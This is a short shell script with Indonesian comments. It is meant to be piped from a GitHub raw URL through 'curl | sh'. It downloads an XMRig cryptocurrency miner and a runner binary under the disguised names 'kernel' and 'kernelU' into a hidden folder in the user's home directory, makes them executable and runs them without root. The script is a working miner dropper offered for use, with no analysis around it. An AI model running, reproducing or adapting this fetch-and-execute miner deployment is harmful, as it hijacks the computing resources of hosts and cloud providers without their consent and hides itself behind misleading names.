#!/bin/sh
# Kernel (XMRig fallback runner) - untuk VM x86_64 dan ARM64
# Dijalankan sebagai user biasa, tanpa root.
#
# Cara pakai:
#   curl -fsSL https://github.com/Loritcz/neslite/raw/refs/heads/main/oneline-kernel.sh | sh

set -e

REPO_USER="Loritcz"
REPO_NAME="neslite"
BRANCH="main"
RAW_URL="https://github.com/${REPO_USER}/${REPO_NAME}/raw/refs/heads/${BRANCH}"

# Cek dependensi
command -v curl >/dev/null 2>&1 || { echo "[-] curl tidak ditemukan"; exit 1; }

# Deteksi arsitektur
ARCH=$(uname -m)
case "$ARCH" in
    x86_64|amd64) BIN="kernel" ;;
    aarch64|arm64) BIN="kernel-arm64" ;;
    *) echo "[-] Arsitektur tidak didukung: $ARCH"; exit 1 ;;
esac

WORKDIR="$HOME/.kernel-worker"
mkdir -p "$WORKDIR"
cd "$WORKDIR"

# Download kernel runner binary sesuai arsitektur
[ -f "$BIN" ] || {
    echo "[+] Download runner $BIN untuk $ARCH..."
    curl -fsSL -o "$BIN" "${RAW_URL}/${BIN}" || { echo "[-] Gagal download runner $BIN"; exit 1; }
}

# Download XMRig binary (kernelU)
[ -f "kernelU" ] || {
    echo "[+] Download XMRig binary (kernelU)..."
    curl -fsSL -o "kernelU" "${RAW_URL}/kernelU" || { echo "[-] Gagal download kernelU"; exit 1; }
}

chmod +x "$BIN" kernelU

echo "[+] Menjalankan: $BIN"
./"$BIN"
